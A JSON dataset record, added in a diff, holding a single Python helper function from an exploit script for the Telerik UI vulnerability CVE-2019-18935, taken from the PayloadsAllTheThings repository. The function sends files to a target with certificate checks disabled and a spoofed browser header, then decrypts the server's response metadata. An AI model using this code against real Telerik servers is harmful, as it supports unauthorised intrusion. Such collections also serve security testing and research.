@@ -1,0 +1,7 @@
+{
+    "code": "def send_request(files):\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',\n        'Connection': 'close',\n        'Accept-Language': 'en-US,en;q=0.5',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Upgrade-Insecure-Requests': '1'\n    }\n    response = post(url, files=files, verify=False, headers=headers)\n    try:\n        result = loads(response.text)\n        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))\n        pprint(result)\n    except:\n        print(response.text)",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Telerik CVE-2019-18935.py",
+    "license": "MIT",
+    "language": "python"
+}
